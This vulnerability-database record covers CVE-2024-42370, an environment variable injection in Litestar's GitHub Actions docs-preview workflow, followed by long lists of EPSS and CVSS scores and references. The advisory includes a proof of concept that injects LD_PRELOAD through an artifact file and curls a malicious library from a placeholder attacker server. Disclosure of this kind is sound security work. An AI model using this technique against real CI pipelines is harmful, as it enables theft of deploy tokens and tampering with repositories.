vulnerability_id: VCID-aaqs-4t1c-aaaa
aliases:
  - CVE-2024-42370
  - GHSA-4hq2-rpgc-r8r7
summary: |
  Litestar has an environment Variable injection in `docs-preview.yml` workflow
  ### Summary
  Litestar's `docs-preview.yml` workflow is vulnerable to Environment Variable injection which may lead to secret exfiltration and repository manipulation.

  ### Environment Variable injection (`GHSL-2024-177`)

  The [`docs-preview.yml` workflow](https://github.com/litestar-org/litestar/blob/ffaf5616b19f6f0f4128209c8b49dbcb41568aa2/.github/workflows/docs-preview.yml) gets triggered when the `Tests And Linting` workflow completes:

  ```yaml
  on:
    workflow_run:
      workflows: [Tests And Linting]
      types: [completed]
  ```

  Later, it downloads and extracts an artifact generated by the triggering workflow:

  ```yaml
  - name: Download artifact
  uses: dawidd6/action-download-artifact@v6
  with:
    workflow_conclusion: success
    run_id: ${{ github.event.workflow_run.id }}
    path: docs-preview
    name: docs-preview
  ```

  And reads `docs-preview/.pr_number` into an Environment Variable:

  ```yaml
  - name: Set PR number
    run: echo "PR_NUMBER=$(cat docs-preview/.pr_number)" >> $GITHUB_ENV
  ```

  The `$GITHUB_ENV` pointed file is just a regular file where every `KEY=VALUE` will be used to define a new Environment Variable after the step completes. Since the contents of the `.pr_number` file have not been validated, they may contain new lines that will cause new Environment Variables to be defined.

  An attacker can send a malicious `.pr_number` file with the following content:

  ```txt
  111
  LD_PRELOAD=/home/runner/work/litestar/litestar/inject.so
  ```

  Which will result in two Environment Variables being defined:

  - PR_NUMBER=111
  - LD_PRELOAD=/home/runner/work/litestar/litestar/inject.so

  In this example we are manipulating the `LD_PRELOAD` environment variable to force the system to load a malicious shared library called `inject.so`. As a result, all subsequent processes launched will automatically incorporate this compromised library into their execution environment.

  The following step will run the `JamesIves/github-pages-deploy-action` action which will [run the `node` command](https://github.com/JamesIves/github-pages-deploy-action/blob/2c9a889f39c2410b2ca1342f465a53a7c5c389b4/action.yml#L5). Therefore the `LD_PRELOAD` will execute arbitrary code when `node` gets executed:

  ```yaml
  - name: Deploy docs preview
    uses: JamesIves/github-pages-deploy-action@v4
    with:
      folder: docs-preview/docs/_build/html
      token: ${{ secrets.DOCS_PREVIEW_DEPLOY_TOKEN }}
      repository-name: litestar-org/litestar-docs-preview
      clean: false
      target-folder: ${{ env.PR_NUMBER }}
      branch: gh-pages
  ```

  #### PoC

  - Clone the repository
  - Edit the `ci.yml` workflow.

  ```yaml
  name: Tests And Linting

  on:
    pull_request:

  jobs:
    upload-patch:
      runs-on: ubuntu-latest
      timeout-minutes: 10
      steps:
        - name: Save PR number and payload
          run: |
            make payload
            echo -e "${{ github.event.number }}\nLD_PRELOAD=/home/runner/work/litestar/litestar/inject.so" > payload/.pr_number
            curl http://<ATTACKER SERVER>/inject.so -o payload/inject.so

        - name: Upload artifact
          uses: actions/upload-artifact@v3
          with:
            name: docs-preview
            path: payload
  ```

  - Create a Pull Request with this change.
  - Since the modified workflow is triggered on `pull_request`, the attacker Pull Request will trigger it and upon completion will trigger the vulnerable `Deploy documentation preview` workflow which will read the malicious artifact and pollute the Environment Variables.

  #### Impact

  This issue will grant a malicious actor the [following permissions](https://github.com/litestar-org/litestar/actions/runs/10081936962/job/27875077668#step:1:17):

  ```
    Issues: write
    Metadata: read
    PullRequests: write
  ```

  In addition, the following secret will get exposed to the attacker: `DOCS_PREVIEW_DEPLOY_TOKEN`

  #### Remediation

  - Verify the contents of the downloaded artifacts.
  - Do not allow new lines in the value redirected to GITHUB_ENV

  ### Resources

  - [CodeQL for JavaScript - Expression injection in Actions](https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/)
  - [Keeping your GitHub Actions and workflows secure Part 2: Untrusted input](https://securitylab.github.com/research/github-actions-untrusted-input/)
  - [Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)

  ## Disclosure Policy
  This report is subject to a 90-day disclosure deadline, as described in more detail in our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).

  ## Note on vulnerability severity
  This global advisory lists the vulnerability at `low` severity while the repository advisory and CVE record list the vulnerability at `high` severity because the confidentiality, integrity, and availability impacts of the vulnerability affect Litestar's CI/CD environment rather than the `litestar` package.
severities:
  - score: '0.00046'
    scoring_system: epss
    scoring_elements: '0.18282'
    published_at: '2024-12-27 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00046'
    scoring_system: epss
    scoring_elements: '0.17893'
    published_at: '2024-11-24 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00046'
    scoring_system: epss
    scoring_elements: '0.17914'
    published_at: '2024-11-26 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00046'
    scoring_system: epss
    scoring_elements: '0.17963'
    published_at: '2024-11-28 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00046'
    scoring_system: epss
    scoring_elements: '0.18042'
    published_at: '2024-12-03 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00046'
    scoring_system: epss
    scoring_elements: '0.18365'
    published_at: '2024-12-11 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00046'
    scoring_system: epss
    scoring_elements: '0.18448'
    published_at: '2024-12-13 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00046'
    scoring_system: epss
    scoring_elements: '0.18555'
    published_at: '2024-12-15 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00046'
    scoring_system: epss
    scoring_elements: '0.18303'
    published_at: '2024-12-17 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00046'
    scoring_system: epss
    scoring_elements: '0.18272'
    published_at: '2024-12-19 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00046'
    scoring_system: epss
    scoring_elements: '0.18553'
    published_at: '2025-01-16 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00046'
    scoring_system: epss
    scoring_elements: '0.17362'
    published_at: '2024-11-01 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00046'
    scoring_system: epss
    scoring_elements: '0.17676'
    published_at: '2024-11-18 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00046'
    scoring_system: epss
    scoring_elements: '0.17778'
    published_at: '2024-11-20 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00046'
    scoring_system: epss
    scoring_elements: '0.17807'
    published_at: '2024-11-21 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00046'
    scoring_system: epss
    scoring_elements: '0.17898'
    published_at: '2024-11-23 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0021'
    scoring_system: epss
    scoring_elements: '0.43757'
    published_at: '2025-04-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0021'
    scoring_system: epss
    scoring_elements: '0.43843'
    published_at: '2025-04-18 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0021'
    scoring_system: epss
    scoring_elements: '0.43751'
    published_at: '2025-04-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0021'
    scoring_system: epss
    scoring_elements: '0.43748'
    published_at: '2025-04-22 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0021'
    scoring_system: epss
    scoring_elements: '0.43815'
    published_at: '2025-04-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0021'
    scoring_system: epss
    scoring_elements: '0.43737'
    published_at: '2025-04-21 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0021'
    scoring_system: epss
    scoring_elements: '0.43741'
    published_at: '2025-04-20 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0021'
    scoring_system: epss
    scoring_elements: '0.43837'
    published_at: '2025-04-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0021'
    scoring_system: epss
    scoring_elements: '0.43753'
    published_at: '2025-04-16 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0021'
    scoring_system: epss
    scoring_elements: '0.43693'
    published_at: '2025-04-15 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00237'
    scoring_system: epss
    scoring_elements: '0.46824'
    published_at: '2025-04-27 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00237'
    scoring_system: epss
    scoring_elements: '0.46863'
    published_at: '2025-04-25 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00237'
    scoring_system: epss
    scoring_elements: '0.46784'
    published_at: '2025-04-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.00237'
    scoring_system: epss
    scoring_elements: '0.46844'
    published_at: '2025-04-26 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0085'
    scoring_system: epss
    scoring_elements: '0.72876'
    published_at: '2025-04-07 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0085'
    scoring_system: epss
    scoring_elements: '0.7278'
    published_at: '2025-03-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0085'
    scoring_system: epss
    scoring_elements: '0.72775'
    published_at: '2025-03-30 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0085'
    scoring_system: epss
    scoring_elements: '0.72862'
    published_at: '2025-04-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0085'
    scoring_system: epss
    scoring_elements: '0.72866'
    published_at: '2025-04-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0085'
    scoring_system: epss
    scoring_elements: '0.72884'
    published_at: '2025-04-04 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0085'
    scoring_system: epss
    scoring_elements: '0.72899'
    published_at: '2025-04-09 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0085'
    scoring_system: epss
    scoring_elements: '0.72882'
    published_at: '2025-04-06 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0085'
    scoring_system: epss
    scoring_elements: '0.72877'
    published_at: '2025-04-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0085'
    scoring_system: epss
    scoring_elements: '0.729'
    published_at: '2025-04-10 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0085'
    scoring_system: epss
    scoring_elements: '0.7291'
    published_at: '2025-04-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0085'
    scoring_system: epss
    scoring_elements: '0.72897'
    published_at: '2025-04-12 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.0085'
    scoring_system: epss
    scoring_elements: '0.72887'
    published_at: '2025-04-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.01094'
    scoring_system: epss
    scoring_elements: '0.7609'
    published_at: '2025-04-14 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: '0.08131'
    scoring_system: epss
    scoring_elements: '0.86691'
    published_at: '2025-03-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-4hq2-rpgc-r8r7
  - score: '8.2'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
    published_at: None
    url: https://github.com/litestar-org/litestar
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/litestar-org/litestar
  - score: '8.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:H
    published_at: None
    url: https://github.com/litestar-org/litestar/actions/runs/10081936962/job/27875077668#step:1:17
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/litestar-org/litestar/actions/runs/10081936962/job/27875077668#step:1:17
  - score: '8.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:H
    published_at: None
    url: https://github.com/litestar-org/litestar/blob/ffaf5616b19f6f0f4128209c8b49dbcb41568aa2/.github/workflows/docs-preview.yml
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/litestar-org/litestar/blob/ffaf5616b19f6f0f4128209c8b49dbcb41568aa2/.github/workflows/docs-preview.yml
  - score: '8.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:H
    published_at: None
    url: https://github.com/litestar-org/litestar/commit/84d351e96aaa2a1338006d6e7221eded161f517b
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/litestar-org/litestar/commit/84d351e96aaa2a1338006d6e7221eded161f517b
  - score: '8.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:H
    published_at: None
    url: https://github.com/litestar-org/litestar/security/advisories/GHSA-4hq2-rpgc-r8r7
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/litestar-org/litestar/security/advisories/GHSA-4hq2-rpgc-r8r7
weaknesses:
  - CWE-937
  - CWE-1035
  - CWE-78
  - CWE-74
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-42370
    reference_type:
    reference_id:
  - url: https://github.com/litestar-org/litestar
    reference_type:
    reference_id:
  - url: https://github.com/litestar-org/litestar/actions/runs/10081936962/job/27875077668#step:1:17
    reference_type:
    reference_id:
  - url: https://github.com/litestar-org/litestar/blob/ffaf5616b19f6f0f4128209c8b49dbcb41568aa2/.github/workflows/docs-preview.yml
    reference_type:
    reference_id:
  - url: https://github.com/litestar-org/litestar/commit/84d351e96aaa2a1338006d6e7221eded161f517b
    reference_type:
    reference_id:
  - url: https://github.com/litestar-org/litestar/security/advisories/GHSA-4hq2-rpgc-r8r7
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-42370
    reference_type:
    reference_id: CVE-2024-42370
  - url: https://github.com/advisories/GHSA-4hq2-rpgc-r8r7
    reference_type:
    reference_id: GHSA-4hq2-rpgc-r8r7
